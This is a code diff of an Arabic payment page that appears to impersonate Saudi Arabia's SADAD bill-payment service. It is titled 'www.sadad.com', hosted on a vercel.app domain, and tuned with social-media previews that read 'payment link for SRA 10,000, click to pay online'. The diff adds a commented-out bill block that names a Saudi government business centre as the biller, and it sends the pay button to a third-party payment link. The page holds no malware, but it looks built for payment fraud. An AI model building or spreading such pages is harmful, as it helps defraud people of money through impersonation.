@@ -6,21 +6,21 @@
     <title>www.sadad.com</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
     <!-- SEO Description -->
-    <meta name="description" id="metaDescription" content="رابط دفع بملغ SRA 12,000.00 انقر للدفع اونلاين ">
+<meta name="description" content="رابط دفع بملغ SRA 10,000.00 انقر للدفع اونلاين ">
 
-    <!-- Open Graph (Facebook / WhatsApp / LinkedIn) -->
-    <meta property="og:title" content="www.sadad.com">
-    <meta property="og:description" id="ogDescription" content="رابط دفع بملغ SRA 12,000.00 انقر للدفع اونلاين ">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://sadad-tau.vercel.app"> <!-- ضع رابط صفحتك -->
-    <meta property="og:image" content="https://sadad-tau.vercel.app/sadad.jpg"> <!-- رابط الصورة -->
-    <meta property="og:locale" content="ar_AR">
+<!-- Open Graph (Facebook / WhatsApp / LinkedIn) -->
+<meta property="og:title" content="www.sadad.com">
+<meta property="og:description"  content="رابط دفع بملغ SRA 10,000.00 انقر للدفع اونلاين ">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sadad-tau.vercel.app"> <!-- ضع رابط صفحتك -->
+<meta property="og:image" content="https://sadad-tau.vercel.app/sadad.jpg"> <!-- رابط الصورة -->
+<meta property="og:locale" content="ar_AR">
 
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="www.sadad.com">
-    <meta name="twitter:description" id="twitterDescription" content="رابط دفع بملغ SRA 12,000.00 انقر للدفع اونلاين ">
-    <meta name="twitter:image" content="https://sadad-tau.vercel.app/sadad.jpg">
+<!-- Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="www.sadad.com">
+<meta name="twitter:description" content="رابط دفع بملغ SRA 10,000.00 انقر للدفع اونلاين ">
+<meta name="twitter:image" content="https://sadad-tau.vercel.app/sadad.jpg">
     <style>
         :root {
             --primary-bg: #fdfdfd;
@@ -32,27 +32,27 @@
             --orange-status: #f39c12;
         }
 
-        body {
-            font-family: 'Tajawal', sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
-            margin: 0;
-            color: var(--text-dark);
-            padding: 20px;
-        }
+body {
+    font-family: 'Tajawal', sans-serif;
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    margin: 0;
+    color: var(--text-dark);
+    padding: 20px;
+}
 
-        .checkout-card {
-            background: white;
-            width: 100%;
-            max-width: 450px;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            box-sizing: border-box;
-        }
+      .checkout-card {
+    background: white;
+    width: 100%;
+    max-width: 450px;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    box-sizing: border-box;
+}
 
         /* قسم المبالغ */
         .summary-box {
@@ -114,13 +114,13 @@
         }
 
         .apple-pay-box {
-            height: 10px;
+          height: 10px;
             opacity: 0.8;
         }
 
         .btn-pay {
             width: 100%;
-            background-color: #000; 
+ background-color: #000; 
             color: white;
             border: none;
             padding: 14px;
@@ -137,9 +137,10 @@
 
         .btn-pay:hover {
             background-color: white;
-            color: #000 ;
-            border: 1px solid #000;
-            border-radius: 8px;
+                        color: #000 ;
+             border: 1px solid #000; /* البوردر أسود */
+    border-radius: 8px;
+
         }
 
         /* قسم سداد */
@@ -185,59 +186,69 @@
             margin-right: 10px;
         }
         .currency-icon {
-            width: 18px;
-            height: 18px;
-            vertical-align: middle;
-            margin-right: 6px;
-            object-fit: contain;
-        }
-        /* تابلت */
-        @media (max-width: 768px) {
-            .checkout-card {
-                max-width: 100%;
-                padding: 20px;
-            }
-            .total-amount {
-                font-size: 22px;
-            }
-            .btn-pay {
-                font-size: 15px;
-                padding: 12px;
-            }
-        }
+    width: 18px;
+    height: 18px;
+    vertical-align: middle;
+    margin-right: 6px;
+    object-fit: contain;
+}
+/* تابلت */
+@media (max-width: 768px) {
+    .checkout-card {
+        max-width: 100%;
+        padding: 20px;
+    }
 
-        /* موبايل صغير */
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-            }
-            .checkout-card {
-                padding: 15px;
-                border-radius: 10px;
-            }
-            .summary-box {
-                padding: 15px;
-            }
-            .total-title {
-                font-size: 18px;
-            }
-            .total-amount {
-                font-size: 20px;
-            }
-            .amount-literal {
-                font-size: 11px;
-            }
-            .payment-methods {
-                gap: 8px;
-                flex-wrap: wrap;
-            }
-            .payment-methods img {
-                height: 20px;
-            }
-            .btn-pay {
-                font-size: 14px;
-            }
-        }
+    .total-amount {
+        font-size: 22px;
+    }
+
+    .btn-pay {
+        font-size: 15px;
+        padding: 12px;
+    }
+}
+
+/* موبايل صغير */
+@media (max-width: 480px) {
+    body {
+        padding: 10px;
+    }
+
+    .checkout-card {
+        padding: 15px;
+        border-radius: 10px;
+    }
+
+    .summary-box {
+        padding: 15px;
+    }
+
+    .total-title {
+        font-size: 18px;
+    }
+
+    .total-amount {
+        font-size: 20px;
+    }
+
+    .amount-literal {
+        font-size: 11px;
+    }
+
+    .payment-methods {
+        gap: 8px;
+        flex-wrap: wrap;
+    }
+
+    .payment-methods img {
+        height: 20px;
+    }
+
+    .btn-pay {
+        font-size: 14px;
+    }
+}
     </style>
 </head>
 <body>
@@ -249,14 +260,16 @@
             <span>0.00  
             <img src="riyal.svg" class="currency-icon">
             </span>
+            
         </div>
         <div class="total-title">المجموع الكلي</div>
-        <div class="total-amount" id="totalAmountDisplay">
-            12,000.00
-            <img src="riyal.svg" class="currency-icon" alt="ريال">
-        </div>
-        <div class="amount-literal" id="amountLiteral">
-            اثنا عشر ألفاً ريال سعودي صفر هللات فقط
+<div class="total-amount">
+    10,000.00
+    <img src="riyal.svg" class="currency-icon" alt="ريال">
+</div>
+        <div class="amount-literal">
+            عشره ألف ريال سعودي صفر هللات فقط
+            
         </div>
     </div>
 
@@ -265,12 +278,14 @@
         <img src="Visa_Inc._logo.png" alt="Visa">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
         <img src="madaLogo.png" alt="Mada" style="height:15px">
-        <img class="apple-pay-box" src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay">
+        
+            <img class="apple-pay-box" src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay">
+        
     </div>
     
-    <button class="btn-pay" onclick="handleCardPayment(this)">
-        ادفع عن طريق البطاقة
-    </button>
+ <button class="btn-pay" onclick="handleCardPayment(this)">
+    ادفع عن طريق البطاقة
+</button>
 
     <div class="sadad-divider"></div>
     
@@ -278,129 +293,39 @@
         <span class="section-title">أو ادفع عن طريق سداد</span>
         <img src="SADAD-Logo.png" class="sadad-logo" alt="SADAD">
     </div>
+
+    <!-- <div class="sadad-info-box">
+        <div class="info-row">
+            <span class="label">رقم سداد</span>
+            <span class="value">2604210028418</span>
+            <span class="status-badge">بانتظار الدفع</span>
+        </div>
+        <div class="info-row">
+            <span class="label">تاريخ الإصدار</span>
+            <span class="value">2026/04/14 03:05 ص</span>
+        </div>
+        <div class="info-row">
+            <span class="label">تاريخ الانتهاء</span>
+            <span class="value">2026/04/19 03:05 ص</span>
+        </div>
+        <div class="info-row">
+            <span class="label">اسم المفوتر</span>
+            <span class="value">المركز السعودي للأعمال الاقتصادية</span>
+        </div>
+        <div class="info-row">
+            <span class="label">رقم المفوتر</span>
+            <span class="value">279</span>
+        </div>
+    </div> -->
 </div>
 
 <script>
-// ===================== المتغير الرئيسي =====================
-// قم بتغيير هذه القيمة وسيتغير كل شيء تلقائياً
-let totalAmount = "12,000.00";
-// =========================================================
-
-// دالة لتحديث كل الأماكن التي تعرض المبلغ
-function updateTotalAmount(value) {
-    // تحديث في الشاشة (div)
-    const totalDiv = document.getElementById("totalAmountDisplay");
-    if (totalDiv) {
-        // نحافظ على الأيقونة الموجودة داخله
-        totalDiv.innerHTML = value + ' <img src="riyal.svg" class="currency-icon" alt="ريال">';
-    }
-    
-    // تحديث الوصف النصي (الأرقام بالحروف)
-    const amountLiteralSpan = document.getElementById("amountLiteral");
-    if (amountLiteralSpan) {
-        const numberValue = parseFloat(value);
-        if (!isNaN(numberValue)) {
-            amountLiteralSpan.innerText = convertNumberToArabicWords(numberValue);
-        } else {
-            amountLiteralSpan.innerText = value + " ريال سعودي فقط";
-        }
-    }
-    
-    // تحديث meta tags
-    const metaDesc = document.getElementById("metaDescription");
-    const ogDesc = document.getElementById("ogDescription");
-    const twitterDesc = document.getElementById("twitterDescription");
-    
-    const newDesc = `رابط دفع بملغ SRA ${value} انقر للدفع اونلاين `;
-    if (metaDesc) metaDesc.setAttribute("content", newDesc);
-    if (ogDesc) ogDesc.setAttribute("content", newDesc);
-    if (twitterDesc) twitterDesc.setAttribute("content", newDesc);
-}
-
-// دالة تحويل الأرقام إلى كلمات (للمبالغ البسيطة)
-function convertNumberToArabicWords(num) {
-    if (isNaN(num)) return "صفر ريال";
-    let integerPart = Math.floor(num);
-    let decimalPart = Math.round((num - integerPart) * 100);
-    
-    const ones = ["", "واحد", "اثنان", "ثلاثة", "أربعة", "خمسة", "ستة", "سبعة", "ثمانية", "تسعة"];
-    const tens = ["", "عشرة", "عشرون", "ثلاثون", "أربعون", "خمسون", "ستون", "سبعون", "ثمانون", "تسعون"];
-    const hundreds = ["", "مائة", "مائتان", "ثلاثمائة", "أربعمائة", "خمسمائة", "ستمائة", "سبعمائة", "ثمانمائة", "تسعمائة"];
-    
-    function convertLessThanThousand(n) {
-        if (n === 0) return "";
-        if (n < 10) return ones[n];
-        if (n < 20) {
-            if (n === 10) return "عشرة";
-            if (n === 11) return "أحد عشر";
-            if (n === 12) return "اثنا عشر";
-            return ones[n - 10] + " عشر";
-        }
-        if (n < 100) {
-            let unit = n % 10;
-            let ten = Math.floor(n / 10);
-            if (unit === 0) return tens[ten];
-            return ones[unit] + " و" + tens[ten];
-        }
-        if (n < 1000) {
-            let hundred = Math.floor(n / 100);
-            let remainder = n % 100;
-            let hundredText = hundreds[hundred];
-            if (remainder === 0) return hundredText;
-            return hundredText + " و" + convertLessThanThousand(remainder);
-        }
-        return "";
-    }
-    
-    function convertThousands(n) {
-        if (n === 0) return "";
-        if (n === 1) return "ألف";
-        if (n === 2) return "ألفان";
-        if (n >= 3 && n <= 10) return convertLessThanThousand(n) + " آلاف";
-        return convertLessThanThousand(n) + " ألف";
-    }
-    
-    let thousandsPart = Math.floor(integerPart / 1000);
-    let restPart = integerPart % 1000;
-    let result = "";
-    
-    if (thousandsPart > 0) {
-        result += convertThousands(thousandsPart);
-        if (restPart > 0) result += " و";
-    }
-    if (restPart > 0) {
-        result += convertLessThanThousand(restPart);
-    }
-    if (integerPart === 0) result = "صفر";
-    
-    result += " ريال سعودي";
-    if (decimalPart > 0) {
-        result += " و" + convertLessThanThousand(decimalPart) + " هللة";
-    } else {
-        result += " صفر هللات";
-    }
-    return result + " فقط";
-}
-
-// دالة لتغيير المبلغ يدوياً من أي مكان (مثلاً من console أو استدعاء خارجي)
-function setTotalAmount(newAmount) {
-    totalAmount = newAmount;
-    updateTotalAmount(totalAmount);
-}
-
-// عند تحميل الصفحة، نطبق القيمة الأولية
-window.onload = function() {
-    setTotalAmount(totalAmount);
-    console.log("صفحة الدفع جاهزة. المبلغ الحالي: " + totalAmount);
-};
-
-// دالة الدفع (كما هي)
 function handleCardPayment(btn) {
     btn.innerText = "جاري التحويل...";
     btn.disabled = true;
 
     window.open(
-        "https://secure.paytabs.sa/payment/link/129940/1957771",
+        "https://business.neoleap.com.sa/pg-pay-links/invoice?id=pB1SF65fP7kT9C3jlQBsePggY8yW6gGmWrjmdmrsuuatZy6Q4nkfZDM9gZIXwUpP",
         "_blank",
         "noopener,noreferrer"
     );
@@ -410,6 +335,10 @@ function handleCardPayment(btn) {
         btn.disabled = false;
     }, 3000);
 }
+
+window.onload = function() {
+    console.log("صفحة الدفع جاهزة.");
+};
 </script>
 
 </body>
